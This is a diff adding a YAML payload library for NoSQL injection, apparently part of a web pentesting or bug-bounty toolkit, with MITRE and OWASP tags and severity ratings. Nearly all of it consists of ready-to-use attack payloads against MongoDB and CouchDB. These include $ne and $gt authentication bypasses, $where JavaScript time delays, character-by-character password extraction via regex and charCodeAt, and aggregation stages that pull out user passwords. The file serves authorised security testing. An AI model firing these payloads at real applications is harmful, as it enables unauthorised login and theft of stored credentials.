@@ -1,0 +1,220 @@
+id: nosqli
+name: NoSQL Injection
+version: 1.0.0
+category: injection
+description: |
+  NoSQL injection payloads targeting MongoDB, CouchDB, and similar document
+  stores. Covers operator injection in JSON bodies, query string operator
+  syntax, JavaScript $where evaluation, and authentication bypass tricks.
+mitre:
+  - T1190
+owasp_top10:
+  - A03:2021
+references:
+  - https://owasp.org/www-community/Injection_Theory#nosql-injection
+  - https://book.hacktricks.xyz/pentesting-web/nosql-injection
+  - https://github.com/payloadbox/nosqli-payload-list
+related_tools:
+  - nuclei
+  - nosqlmap
+chains:
+  - bug_bounty_full
+  - web_active
+payloads:
+  - id: ne_null_json
+    name: $ne null auth bypass (JSON)
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [mongodb, node]
+    severity_when_works: critical
+    payload: |
+      {"username": {"$ne": null}, "password": {"$ne": null}}
+    notes: Classic login bypass
+    source: https://book.hacktricks.xyz/pentesting-web/nosql-injection
+  - id: ne_null_querystring
+    name: $ne null auth bypass (querystring)
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [mongodb, node]
+    severity_when_works: critical
+    payload: username[$ne]=null&password[$ne]=null
+    notes: Express body-parser accepts bracket-notation operators
+    source: common knowledge
+  - id: gt_blank
+    name: $gt empty string bypass
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: critical
+    payload: |
+      {"username": "admin", "password": {"$gt": ""}}
+    notes: null
+    source: common knowledge
+  - id: regex_admin
+    name: Regex prefix match
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      {"username": {"$regex": "^adm"}, "password": {"$ne": "x"}}
+    notes: null
+    source: common knowledge
+  - id: where_true
+    name: $where always-true
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      {"$where": "1==1"}
+    notes: Server-side JS evaluation
+    source: common knowledge
+  - id: where_sleep
+    name: $where time-based sleep
+    subcategory: blind
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      {"$where": "sleep(5000)"}
+    notes: 5-second blind delay
+    source: https://book.hacktricks.xyz/pentesting-web/nosql-injection
+  - id: where_function
+    name: $where function with this
+    subcategory: blind
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      {"$where": "function(){ return this.password.length > 0 }"}
+    notes: Boolean blind primitive
+    source: common knowledge
+  - id: regex_dotstar
+    name: Regex .* match-all
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      {"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+    notes: null
+    source: common knowledge
+  - id: in_array
+    name: $in array bypass
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      {"username": {"$in": ["admin", "administrator", "root"]}, "password": {"$ne": ""}}
+    notes: null
+    source: common knowledge
+  - id: exists_true
+    name: $exists true
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: medium
+    payload: |
+      {"password": {"$exists": true}}
+    notes: null
+    source: common knowledge
+  - id: querystring_regex
+    name: Regex via querystring
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [mongodb, node]
+    severity_when_works: high
+    payload: username=admin&password[$regex]=.*
+    notes: null
+    source: common knowledge
+  - id: js_charcode_extract
+    name: charCodeAt blind extract
+    subcategory: blind
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      {"$where": "this.password.charCodeAt(0) == 97"}
+    notes: One char per request
+    source: https://book.hacktricks.xyz/pentesting-web/nosql-injection
+  - id: comment_terminator
+    name: JS comment terminator
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      ' || '1'=='1
+    notes: For string-concat sinks into $where
+    source: common knowledge
+  - id: type_juggling_array
+    name: Type juggling via array
+    subcategory: filter_bypass
+    encoding: raw
+    tech_targets: [node, mongodb]
+    severity_when_works: high
+    payload: username[]=admin&password[]=anything
+    notes: Array compared loosely
+    source: common knowledge
+  - id: regex_anchored
+    name: Anchored regex extraction
+    subcategory: blind
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      {"username": "admin", "password": {"$regex": "^a"}}
+    notes: Iterate prefix to extract password char by char
+    source: common knowledge
+  - id: couchdb_views
+    name: CouchDB temporary view RCE
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [couchdb]
+    severity_when_works: critical
+    payload: |
+      {"language": "javascript", "map": "function(doc) { emit(doc._id, doc); }"}
+    notes: When _temp_view enabled (CouchDB <2.0)
+    source: common knowledge
+  - id: ne_null_array
+    name: $ne with array body
+    subcategory: auth_bypass
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      {"$or": [{"username": "admin"}, {"username": "Admin"}], "password": {"$ne": null}}
+    notes: null
+    source: common knowledge
+  - id: aggregate_lookup
+    name: $lookup data exfil
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      [{"$lookup":{"from":"users","localField":"_id","foreignField":"_id","as":"u"}}]
+    notes: Aggregation pipeline injection
+    source: common knowledge
+  - id: project_password
+    name: Force password projection
+    subcategory: in_band
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      {"$project": {"password": 1, "_id": 0}}
+    notes: null
+    source: common knowledge
+  - id: sleep_var
+    name: $where with delay var
+    subcategory: blind
+    encoding: raw
+    tech_targets: [mongodb]
+    severity_when_works: high
+    payload: |
+      {"$where": "var x=Date.now(); while(Date.now()-x<5000){}; true"}
+    notes: Spin-loop blind detection
+    source: common knowledge
